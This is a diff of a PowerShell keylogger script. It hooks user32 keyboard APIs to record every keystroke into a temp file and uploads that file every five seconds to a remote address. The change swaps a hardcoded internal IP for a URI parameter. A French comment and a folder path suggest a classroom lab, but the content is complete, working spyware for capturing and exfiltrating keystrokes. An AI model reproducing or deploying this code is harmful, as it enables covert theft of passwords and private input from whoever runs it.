@@ -1,4 +1,8 @@
-function Start-Recording($Path = "$env:temp\recorded_log.txt") {
+param (
+    [string]$Uri
+ )
+
+function Start-Recording($Uri, $Path = "$env:temp\recorded_log.txt") {
     # Signatures for API Calls
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -17,48 +21,45 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     # create output file
     $null = New-Item -Path $Path -ItemType File -Force
 
-    try {
-    
-        $startdate = Get-Date
-        # create endless loop. When user presses CTRL+C, finally-block
-        # executes and shows the collected key presses
-       while($true){
-            Start-Sleep -Milliseconds 40
+    $startdate = Get-Date
+    # create endless loop. When user presses CTRL+C, finally-block
+    # executes and shows the collected key presses
+    while($true){
+        Start-Sleep -Milliseconds 40
 
-            #Envoie des données
-            if(($(Get-Date) - $startdate).TotalSeconds -gt 5) {
-                $startdate = Get-Date
-                
-                $wc = New-object System.Net.WebClient
-                $resp = $wc.UploadFile('http://192.168.4.2/keylog',$Path)
-            }
+        #Envoie des données
+        if(($(Get-Date) - $startdate).TotalSeconds -gt 5) {
+            $startdate = Get-Date
 
-            # scan all ASCII codes above 8
-            for ($ascii = 9; $ascii -le 254; $ascii++) {
-                # get current key state
-                $state = $API::GetAsyncKeyState($ascii)
+            $wc = New-object System.Net.WebClient
+            $resp = $wc.UploadFile($Uri,$Path)
+        }
 
-                # is key pressed?
-                if ($state -eq -32767) {
-                    $null = [console]::CapsLock
+        # scan all ASCII codes above 8
+        for ($ascii = 9; $ascii -le 254; $ascii++) {
+            # get current key state
+            $state = $API::GetAsyncKeyState($ascii)
 
-                    # translate scan code to real code
-                    $virtualKey = $API::MapVirtualKey($ascii, 3)
+            # is key pressed?
+            if ($state -eq -32767) {
+                $null = [console]::CapsLock
 
-                    # get keyboard state for virtual keys
-                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
-                    $checkkbstate = $API::GetKeyboardState($kbstate)
+                # translate scan code to real code
+                $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-                    # prepare a StringBuilder to receive input key
-                    $mychar = New-Object -TypeName System.Text.StringBuilder
-                    if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)) {
-                        # add key to logger file
-                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
-                    }
+                # get keyboard state for virtual keys
+                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
+                $checkkbstate = $API::GetKeyboardState($kbstate)
+
+                # prepare a StringBuilder to receive input key
+                $mychar = New-Object -TypeName System.Text.StringBuilder
+                if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)) {
+                    # add key to logger file
+                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                 }
             }
         }
     }
 }
 
-Start-Recording -Path "C:\Users\user\Documents\m2_minientreprise_scripts\scripts\recorded_log.txt"
+Start-Recording($Uri)
